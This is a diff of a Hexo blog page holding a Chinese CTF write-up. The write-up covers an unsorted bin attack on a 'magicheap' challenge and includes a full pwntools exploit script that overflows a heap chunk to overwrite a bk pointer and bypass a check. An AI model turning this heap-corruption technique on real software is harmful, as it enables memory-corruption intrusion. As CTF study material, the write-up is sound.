@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="Unsorted bin attack白板pwn复现​    这题可以用unsorted bin attack解决，64位下当&gt;0x80大小的chunk被free时就会被分配到unsorted bin，而此题可以通过edit控制已经free掉的chunk的fd和bk，经过这么多天的刷题对堆题还是可以说是颇有感悟的，一般堆上的漏洞都发生在free后的chunk中，">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -317,9 +317,90 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="Unsorted-bin-attack白板pwn复现"><a href="#Unsorted-bin-attack白板pwn复现" class="headerlink" title="Unsorted bin attack白板pwn复现"></a>Unsorted bin attack白板pwn复现</h1><p>​    这题可以用unsorted bin attack解决，64位下当&gt;0x80大小的chunk被free时就会被分配到unsorted bin，而此题可以通过edit控制已经free掉的chunk的fd和bk，经过这么多天的刷题对堆题还是可以说是颇有感悟的，一般堆上的漏洞都发生在free后的chunk中，<a id="more"></a>即我们可以通过溢出或其它方法修改已经free掉的chunk的fd、bk、pre_size、size等chunk_header中的元数据，修改指针指向，然后一般就能进行利用了。<br>这题就是这样，edit函数中对用户的输入长度没有做限制，导致攻击者可以通过溢出修改已free的chunk的fd和bk，这里通过修改bk指针使其指向magic-0x10，这样当之前delete后的chunk从unsorted bin中unlink后，magic-0x10的fd就指向了链表头部0x7f1c705ffb78，即magic的值就变为链表头部地址，之后输入choice就可以绕过了。</p>
 <p>贴上exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./magicheap'</span>)</span><br><span class="line"></span><br><span class="line">magic=<span class="number">0x00000000006020C0</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    break *0x0000000000400C8C</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap : '</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'0000'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'2222'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)+p64(<span class="number">0</span>)+p64(magic<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'3333'</span>)  <span class="comment"># the chunk1(index 1) unlink (malloc ) from unsorted bin ,and the fake bk point to the main-arena </span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'4444'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4869'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
 
+p=process(&#39;./magicheap&#39;)
 
+magic=0x00000000006020C0
+
+gdb.attach(p,&#39;&#39;&#39;
+
+    break *0x0000000000400C8C
+
+    continue
+
+&#39;&#39;&#39;)
+
+def create(size,content):
+
+    p.recvuntil(&#39;Your choice :&#39;)
+
+    p.sendline(&#39;1&#39;)
+
+    p.recvuntil(&#39;Size of Heap : &#39;)
+
+    p.sendline(str(size))
+
+    p.recvuntil(&#39;Content of heap:&#39;)
+
+    p.sendline(str(content))
+
+def edit(index,size,content):
+
+    p.recvuntil(&#39;Your choice :&#39;)
+
+    p.sendline(&#39;2&#39;)
+
+    p.recvuntil(&#39;Index :&#39;)
+
+    p.sendline(str(index))
+
+    p.recvuntil(&#39;Size of Heap : &#39;)
+
+    p.sendline(str(size))
+
+    p.recvuntil(&#39;Content of heap : &#39;)
+
+    p.sendline(str(content))
+
+def dele(index):
+
+    p.recvuntil(&#39;Your choice :&#39;)
+
+    p.sendline(&#39;3&#39;)
+
+    p.recvuntil(&#39;Index :&#39;)
+
+    p.sendline(str(index))
+
+def exit():
+
+    p.recvuntil(&#39;Your choice :&#39;)
+
+    p.sendline(&#39;4&#39;)
+
+create(0x80,&#39;0000&#39;)
+
+create(0x80,&#39;1111&#39;)
+
+create(0x80,&#39;2222&#39;)
+
+dele(1)
+
+edit(0,0x100,&#39;a&#39;*0x80+p64(0)+p64(0x90)+p64(0)+p64(magic-0x10))
+
+create(0x80,&#39;3333&#39;)  # the chunk1(index 1) unlink (malloc ) from unsorted bin ,and the fake bk point to the main-arena 
+
+create(0x80,&#39;4444&#39;)
+
+p.recvuntil(&#39;Your choice :&#39;)
+
+p.sendline(&#39;4869&#39;)
+
+print p.recv(1024)
+
+p.interactive()
+</code></pre>
     </div>
 
     
@@ -424,6 +505,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
